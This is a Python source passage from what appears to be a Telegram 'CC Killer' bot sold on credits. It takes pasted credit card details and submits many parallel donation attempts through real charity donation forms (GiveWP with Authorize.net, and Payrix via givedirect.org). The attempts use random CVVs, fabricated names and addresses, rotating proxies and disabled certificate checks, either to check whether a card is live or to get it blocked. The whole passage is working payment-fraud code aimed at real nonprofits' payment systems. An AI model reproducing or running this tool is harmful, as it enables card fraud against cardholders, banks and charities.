        text = message.text or ""
        
        # Check for kill command in reply
        is_kill_cmd = any(cmd in text.lower() for cmd in ['/kill', '/check', '.kill', '#kill'])
        
        if is_kill_cmd and message.reply_to_message:
            text = message.reply_to_message.text or ""
        
        match = CC_PATTERN.search(text)
        if not match:
            if is_kill_cmd or (text.startswith('/') and len(text) < 20):
                self.bot.reply_to(
                    message,
                    f"{self._create_modern_header('INVALID FORMAT', '❌')}\n"
                    f"┃ Use: `xxxxxxxxxxxxxxxx|mm|yy|cvv`\n"
                    f"┃ Example: `4111111111111111|12|25|123`\n"
                    f"{self._create_modern_footer()}",
                    parse_mode="Markdown"
                )
            return

        # Extract card details
        groups = match.groups()
        card_number = None
        exp_month = None
        exp_year = None
        cvv = None
        
        for i in range(0, len(groups), 4):
            if i + 3 < len(groups) and groups[i]:
                card_number = groups[i]
                exp_month = groups[i+1]
                exp_year = groups[i+2]
                cvv = groups[i+3]
                break

        if not all([card_number, exp_month, exp_year, cvv]):
            self.bot.reply_to(message, "❌ Could not extract all card details.")
            return

        # Validate
        if len(exp_month) == 1:
            exp_month = f"0{exp_month}"
        if len(exp_year) == 4:
            exp_year = exp_year[2:]
        
        try:
            month_int = int(exp_month)
            if not (1 <= month_int <= 12):
                self.bot.reply_to(message, "❌ Invalid month. Must be 01-12.")
                return
        except ValueError:
            self.bot.reply_to(message, "❌ Invalid month format.")
            return

        # Check BIN ban
        bin_code = card_number[:6]
        if bin_code in BANNED_BINS:
            self.bot.reply_to(
                message,
                f"{self._create_modern_header('BIN BLOCKED', '⛔')}\n"
                f"┃ BIN `{bin_code}` is restricted\n"
                f"{self._create_modern_footer()}",
                parse_mode="Markdown"
            )
            return

        # Check credits
        credits = self.db.get_credits(user_id)
        if credits < KILL_COST and not self._is_owner(user_id):
            self.bot.reply_to(
                message,
                f"{self._create_modern_header('INSUFFICIENT CREDITS', '⚠️')}\n"
                f"┃ Need: *{KILL_COST}* credit\n"
                f"┃ Have: *{credits}* credits\n"
                f"┃ Available checks: *{credits // KILL_COST}*\n"
                f"{self._create_modern_footer()}",
                parse_mode="Markdown"
            )
            return

        # Process the card
        loading_msg = self.bot.reply_to(
            message,
            f"{self._create_modern_header('PROCESSING', '⚡')}\n"
            f"┃ {self._create_progress_animation(0)}\n"
            f"┃ {Styles.CARD} Verifying card...\n"
            f"{self._create_modern_footer()}",
            parse_mode="Markdown"
        )
        
        self._process_card(message, loading_msg, card_number, exp_month, exp_year, cvv)

    def _process_card(self, message, loading_msg, card_number, exp_month, exp_year, cvv):
        """Process a card through both gateways with proxy rotation."""
        user_id = message.from_user.id
        chat_id = message.chat.id
        start_time = time.time()
        proxy_used = None

        try:
            # Get preferred proxy
            preferred = self.db.get_preferred_proxy(user_id)
            
            # Get a proxy
            proxy_dict = None
            if preferred and preferred != 'AUTO':
                proxy_used = preferred
                proxy_dict = self.proxy_manager._parse_proxy_string(preferred)
            else:
                proxy_dict = self.proxy_manager.get_next_proxy()
                if proxy_dict:
                    proxy_used = proxy_dict['proxy_string']
            
            self._update_loading_modern(loading_msg, 0, "Initializing...", proxy_used)
            
            # Get BIN info
            bin_info = self._get_bin_info(card_number, proxy_used)
            
            self._update_loading_modern(loading_msg, 1, "Authenticating...", proxy_used)
            
            # Get form signatures
            signature, expiration_time = self._get_form_signatures(proxy_used)
            
            if not signature or not expiration_time:
                self._update_loading_modern(loading_msg, 4, "Gateway error", proxy_used)
                self.bot.edit_message_text(
                    f"{self._create_modern_header('GATEWAY ERROR', '❌')}\n"
                    f"┃ Target site unreachable\n"
                    f"┃ Try again later or use different proxy\n"
                    f"{self._create_modern_footer()}",
                    chat_id,
                    loading_msg.message_id,
                    parse_mode="Markdown"
                )
                return

            expiration = f"{exp_month}{exp_year}"
            donation_params = {
                'givewp-route': "donate",
                'givewp-route-signature': signature,
                'givewp-route-signature-id': "givewp-donate",
                'givewp-route-signature-expiration': expiration_time
            }

            # Parallel kill attempts
            self._update_loading_modern(loading_msg, 2, "Killing...", proxy_used)
            num_requests = MAX_WORKERS
            results = []
            
            with ThreadPoolExecutor(max_workers=num_requests) as executor:
                futures = [
                    executor.submit(
                        self._process_donation_attempt,
                        card_number,
                        expiration,
                        donation_params,
                        i + 1,
                        proxy_used
                    )
                    for i in range(num_requests)
                ]
                for future in as_completed(futures):
                    try:
                        results.append(future.result(timeout=HTTP_TIMEOUT))
                    except Exception as e:
                        logger.error("Thread error: %s", e)
                        results.append(True)

            declined_count = sum(1 for r in results if r is True)
            is_killed = (declined_count == num_requests)
            killer_status = "KILLED ✅" if is_killed else "LIVE 🤔"

            # Secondary gateway (Payrix)
            self._update_loading_modern(loading_msg, 3, "Secondary gateway...", proxy_used)
            payrix_result = self._process_payrix_payment(card_number, exp_month, exp_year, cvv, proxy_used)

            # Deduct credits if killed
            if is_killed and not self._is_owner(user_id):
                self.db.update_credits(user_id, -KILL_COST)
                self.db.update_user_stats(user_id, True)
                logger.info("User %d: Killed card %s", user_id, card_number[:6] + "****")
            else:
                self.db.update_user_stats(user_id, False)

            # Log transaction
            self.db.log_transaction(
                user_id,
                card_number[:6] + "****" + card_number[-4:],
                "KILLED" if is_killed else "LIVE",
                f"Primary: {killer_status}, Payrix: {payrix_result}",
                proxy_used or "None"
            )

            # Final result
            self._update_loading_modern(loading_msg, 4, "Complete", proxy_used)
            elapsed = round(time.time() - start_time, 2)
            credits_left = "♾️" if self._is_owner(user_id) else str(self.db.get_credits(user_id))

            # Mask proxy for display
            display_proxy = proxy_used
            if display_proxy and '@' in display_proxy:
                parts = display_proxy.split('@')
                if len(parts) == 2 and ':' in parts[0]:
                    user, _ = parts[0].split(':', 1)
                    display_proxy = f"{user}:****@{parts[1]}"

            result_text = (
                f"{self._create_modern_header('KILLER RESULT', '💀')}\n"
                f"┃ {self._create_card_display(card_number, exp_month, exp_year, cvv)}\n"
                f"┃ {Styles.THIN_BORDER}\n"
                f"┃ {Styles.INFO} BIN: `{card_number[:6]}` | {bin_info.get('brand', 'Unknown')}\n"
                f"┃ {Styles.INFO} Bank: {bin_info.get('bank', 'Unknown')}\n"
                f"┃ {Styles.INFO} Country: {bin_info.get('country', 'Unknown')} ({bin_info.get('country_code', 'N/A')})\n"
                f"┃ {Styles.THIN_BORDER}\n"
                f"┃ Primary: {killer_status}\n"
                f"┃ Secondary: {payrix_result}\n"
                f"┃ {Styles.THIN_BORDER}\n"
                f"┃ {Styles.CLOCK} Time: *{elapsed}s*\n"
                f"┃ {Styles.CREDIT} Credits: *{credits_left}*\n"
                f"┃ {Styles.PROXY} Proxy: `{display_proxy[:35] if display_proxy else 'None'}`\n"
                f"{self._create_modern_footer()}"
            )

            try:
                self.bot.edit_message_text(
                    result_text,
                    chat_id,
                    loading_msg.message_id,
                    parse_mode="Markdown"
                )
            except Exception as e:
                logger.error("Edit message error: %s", e)
                self.bot.send_message(chat_id, result_text, parse_mode="Markdown")

        except Exception as e:
            logger.error("Card processing error for user %d: %s", user_id, e)
            try:
                self.bot.edit_message_text(
                    f"{self._create_modern_header('ERROR', '❌')}\n"
                    f"┃ Internal error occurred\n"
                    f"┃ Please try again later\n"
                    f"{self._create_modern_footer()}",
                    chat_id,
                    loading_msg.message_id,
                    parse_mode="Markdown"
                )
            except Exception:
                pass

    def _update_loading_modern(self, message, stage: int, status: str = "", proxy: str = ""):
        """Update loading message with modern UI."""
        try:
            bar = self._create_progress_animation(stage)
            # Mask proxy for display
            display_proxy = proxy
            if display_proxy and '@' in display_proxy:
                parts = display_proxy.split('@')
                if len(parts) == 2 and ':' in parts[0]:
                    user, _ = parts[0].split(':', 1)
                    display_proxy = f"{user}:****@{parts[1]}"
            
            text = (
                f"{self._create_modern_header('PROCESSING', '⚡')}\n"
                f"┃ {bar}\n"
                f"┃ {Styles.ARROW} {status}\n"
            )
            if display_proxy:
                text += f"┃ {Styles.PROXY} Proxy: `{display_proxy[:35]}...`\n"
            text += self._create_modern_footer()
            
            self.bot.edit_message_text(
                text,
                message.chat.id,
                message.message_id,
                parse_mode="Markdown"
            )
        except Exception as e:
            if "message is not modified" not in str(e):
                logger.debug("Loading update error: %s", e)

    # -------------------------------------------------------------------------
    # NETWORK HELPERS (WITH PROXY SUPPORT)
    # -------------------------------------------------------------------------
    def _get_proxies_dict(self, proxy_string: Optional[str] = None) -> Optional[Dict[str, str]]:
        """Convert proxy string to requests proxy dict with auth support."""
        if not proxy_string:
            return None
        return {
            'http': proxy_string,
            'https': proxy_string
        }

    def _get_bin_info(self, card_number: str, proxy_string: Optional[str] = None) -> Dict[str, str]:
        """Fetch BIN information with proxy support."""
        try:
            bin_number = card_number[:6]
            url = f"https://api.juspay.in/cardbins/{bin_number}"
            proxies = self._get_proxies_dict(proxy_string)
            
            response = requests.get(
                url,
                timeout=HTTP_TIMEOUT,
                proxies=proxies,
                verify=False
            )
            if response.status_code == 200:
                data = response.json()
                return {
                    "brand": data.get("brand", "Unknown"),
                    "type": data.get("type", "Unknown"),
                    "sub_type": data.get("card_sub_type", "Unknown"),
                    "bank": data.get("bank", "Unknown"),
                    "country": data.get("country", "Unknown"),
                    "country_code": data.get("country_code", "Unknown")
                }
        except requests.exceptions.ProxyError:
            if proxy_string:
                self.proxy_manager.mark_proxy_dead(proxy_string)
        except Exception as e:
            logger.debug("BIN lookup error: %s", e)
        return {}

    def _get_form_signatures(self, proxy_string: Optional[str] = None) -> Tuple[Optional[str], Optional[str]]:
        """Extract GiveWP form signatures with proxy support."""
        try:
            params = {
                'givewp-route': "donation-form-view",
                'form-id': SITE_CONFIG["form_id"]
            }
            headers = {
                'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
                'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                'Accept-Language': "en-US,en;q=0.9",
                'Cache-Control': "no-cache"
            }
            proxies = self._get_proxies_dict(proxy_string)
            
            response = requests.get(
                SITE_CONFIG["base_url"],
                params=params,
                headers=headers,
                timeout=HTTP_TIMEOUT,
                proxies=proxies,
                verify=False
            )
            
            if response.status_code == 200:
                pattern = r"givewp-route-signature=([a-f0-9]+).*?givewp-route-signature-expiration=(\d+)"
                matches = re.findall(pattern, response.text)
                if matches:
                    return matches[0][0], matches[0][1]
        except requests.exceptions.ProxyError:
            if proxy_string:
                self.proxy_manager.mark_proxy_dead(proxy_string)
        except Exception as e:
            logger.error("Form signature error: %s", e)
        return None, None

    def _process_donation_attempt(self, card_number: str, expiration: str, donation_params: Dict,
                                  attempt: int, proxy_string: Optional[str] = None) -> bool:
        """Single donation attempt with proxy support."""
        try:
            cvv = str(random.randint(100, 999))
            amount = str(random.randint(50000, 150000))
            first_name, last_name = self._generate_random_name()
            phone = self._generate_random_phone()
            email = self._generate_random_email(first_name, last_name)
            address1, city, state, zip_code = self._generate_random_address()

            proxies = self._get_proxies_dict(proxy_string)

            # Auth request
            auth_url = "https://api2.authorize.net/xml/v1/request.api"
            auth_payload = {
                "securePaymentContainerRequest": {
                    "merchantAuthentication": {
                        "name": SITE_CONFIG["auth_name"],
                        "clientKey": SITE_CONFIG["auth_client_key"]
                    },
                    "data": {
                        "type": "TOKEN",
                        "id": SITE_CONFIG["auth_id"],
                        "token": {
                            "cardNumber": card_number,
                            "expirationDate": expiration,
                            "cardCode": cvv
                        }
                    }
                }
            }
            
            auth_headers = {
                'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
                'Content-Type': "application/json",
                'Accept': "application/json"
            }
            
            auth_response = requests.post(
                auth_url,
                data=json.dumps(auth_payload),
                headers=auth_headers,
                timeout=HTTP_TIMEOUT,
                proxies=proxies,
                verify=False
            )
            
            if auth_response.status_code != 200:
                return True
            
            auth_data = json.loads(auth_response.text.lstrip('\ufeff'))
            if auth_data.get("messages", {}).get("resultCode") != "Ok":
                return True

            data_descriptor = auth_data.get("opaqueData", {}).get("dataDescriptor")
            data_value = auth_data.get("opaqueData", {}).get("dataValue")
            
            if not data_descriptor or not data_value:
                return True

            # Donation request
            donation_payload = {
                'amount': amount,
                'currency': 'USD',
                'donationType': 'single',
                'formId': SITE_CONFIG["form_id"],
                'gatewayId': 'authorize',
                'firstName': first_name,
                'lastName': last_name,
                'email': email,
                'anonymous': 'false',
                'comment': '',
                'company': 'Neend gen',
                'phone': phone,
                'country': 'US',
                'address1': address1,
                'address2': '',
                'city': city,
                'state': state,
                'zip': zip_code,
                'originUrl': SITE_CONFIG["referer_base"],
                'gatewayData[give_authorize_data_descriptor]': data_descriptor,
                'gatewayData[give_authorize_data_value]': data_value
            }
            
            donation_headers = {
                'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
                'Accept': "application/json",
                'Content-Type': "application/x-www-form-urlencoded",
                'Referer': SITE_CONFIG["base_url"] + "/",
                'Origin': SITE_CONFIG["base_url"]
            }
            
            donation_response = requests.post(
                SITE_CONFIG["base_url"],
                params=donation_params,
                data=donation_payload,
                headers=donation_headers,
                timeout=HTTP_TIMEOUT,
                proxies=proxies,
                verify=False
            )
            
            if donation_response.status_code != 200:
                return True
                
            try:
                donation_data = donation_response.json()
                return not donation_data.get("success", False)
            except json.JSONDecodeError:
                return True
                
        except requests.exceptions.ProxyError:
            if proxy_string:
                self.proxy_manager.mark_proxy_dead(proxy_string)
            return True
        except Exception as e:
            logger.debug("Donation attempt %d failed: %s", attempt, e)
            return True

    def _process_payrix_payment(self, card_number: str, exp_month: str, exp_year: str,
                                 cvv: str, proxy_string: Optional[str] = None) -> str:
        """Process through Payrix gateway with proxy support."""
        try:
            gateway = random.choice(PAYMENT_GATEWAYS)
            cid = gateway["cid"]
            merchant = gateway["merchant"]
            proxies = self._get_proxies_dict(proxy_string)

            # Step 1: Get txnsession_key
            url1 = "https://donate.givedirect.org"
            params = {'cid': cid}
            headers1 = {
                'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
                'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                'Referer': "https://www.womensurgeons.org/donate-to-the-foundation"
            }
            
            response1 = requests.get(
                url1,
                params=params,
                headers=headers1,
                timeout=HTTP_TIMEOUT,
                proxies=proxies,
                verify=False
            )
            soup = BeautifulSoup(response1.text, 'html.parser')
            txnsession_input = soup.find('input', {'id': 'txnsession_key'})
            
            if not txnsession_input:
                return "❌ Session key failed"
            
            txnsession_key = txnsession_input.get('value', '')
            if not txnsession_key:
                return "❌ Empty session key"

            # Step 2: Process payment
            url2 = "https://api.payrix.com/txns"
            payload = {
                'origin': "1",
                'merchant': merchant,
                'type': "2",
                'total': "0",
                'description': "donate live site",
                'payment[number]': card_number,
                'payment[cvv]': cvv,
                'expiration': f"{exp_month}{exp_year}",
                'zip': "",
                'last': "Tech"
            }
            headers2 = {
                'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
                'Accept': "application/json, text/javascript, */*; q=0.01",
                'txnsessionkey': txnsession_key,
                'x-requested-with': "XMLHttpRequest"
            }
            
            response2 = requests.post(
                url2,
                data=payload,
                headers=headers2,
                timeout=HTTP_TIMEOUT,
                proxies=proxies,
                verify=False
            )
            resp_json = response2.json()
            
            errors = resp_json.get('response', {}).get('errors', [])
            if errors:
                error_msg = errors[0].get('msg', 'Unknown error')
                if "Transaction declined" in error_msg or "No 'To' Account Specified" in error_msg:
                    return "❌ Declined"
                return f"❌ {error_msg[:25]}..."
            else:
                return "✅ Approved"
                
        except requests.exceptions.ProxyError:
            if proxy_string:
                self.proxy_manager.mark_proxy_dead(proxy_string)
            return "⚠️ Proxy Error"
        except Exception as e:
            logger.debug("Payrix error: %s", e)
            return "⚠️ Gateway Error"

    # -------------------------------------------------------------------------
    # RANDOM DATA GENERATORS
    # -------------------------------------------------------------------------
    @staticmethod
    def _generate_random_name() -> Tuple[str, str]:
        first_names = ["John", "Emma", "Michael", "Sarah", "David", "Lisa", "James", "Anna", "Robert", "Maria"]
        last_names = ["Smith", "Johnson", "Brown", "Taylor", "Wilson", "Davis", "Clark", "Lewis", "Walker", "Hall"]
        return random.choice(first_names), random.choice(last_names)

    @staticmethod
    def _generate_random_phone() -> str:
        return f"+1{random.randint(200, 999)}{random.randint(200, 999)}{random.randint(1000, 9999)}"

    @staticmethod
    def _generate_random_email(first_name: str, last_name: str) -> str:
        domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "protonmail.com"]
        rand_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
        return f"{first_name.lower()}{last_name.lower()}{rand_str}@{random.choice(domains)}"

    @staticmethod
    def _generate_random_address() -> Tuple[str, str, str, str]:
        streets = ["Main", "Park", "Oak", "Pine", "Cedar", "Elm", "Washington", "Lake", "Maple", "Hill"]
        cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego"]
        states = ["NY", "CA", "IL", "TX", "AZ", "PA", "FL", "OH"]
        return (
            f"{random.randint(1, 999)} {random.choice(streets)} St",
            random.choice(cities),
            random.choice(states),
            str(random.randint(10000, 99999))
        )

    # -------------------------------------------------------------------------
    # RUN LOOP
    # -------------------------------------------------------------------------
    def run(self):
        """Start the bot with graceful shutdown."""
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
        
        logger.info("Starting CC Killer Bot v3.2 - Ultra Modern with Auth Proxy Support")
        logger.info("Owner ID: %d", self.owner_id)
        logger.info("Proxy rotation interval: %ds", PROXY_ROTATION_INTERVAL)
        
        # Start proxy rotation thread
        def rotate_proxies():
            while self.running:
                time.sleep(PROXY_ROTATION_INTERVAL)
                self.proxy_manager._load_proxies()
                logger.debug("Proxy rotation: %d proxies loaded", len(self.proxy_manager._proxies))
        
        rotation_thread = threading.Thread(target=rotate_proxies, daemon=True)
        rotation_thread.start()
        
        try:
            self.bot.polling(none_stop=True, interval=0.5, timeout=60)
        except Exception as e:
            logger.critical("Bot polling error: %s", e)
            sys.exit(1)

    def _signal_handler(self, sig, frame):
        logger.info("Received shutdown signal. Stopping bot...")
        self.running = False
        try:
            self.bot.stop_polling()
        except Exception:
            pass
        sys.exit(0)

# -----------------------------------------------------------------------------
# ENTRY POINT
# -----------------------------------------------------------------------------
if __name__ == "__main__":
    # Verify dependencies
    try:
        import telebot, requests, bs4
    except ImportError as e:
        print(f"ERROR: Missing dependency: {e}")
        print("Install: pip3 install pyTelegramBotAPI requests beautifulsoup4")
        sys.exit(1)
    
    bot = CCKillerBot(BOT_TOKEN, OWNER_ID)
    bot.run()
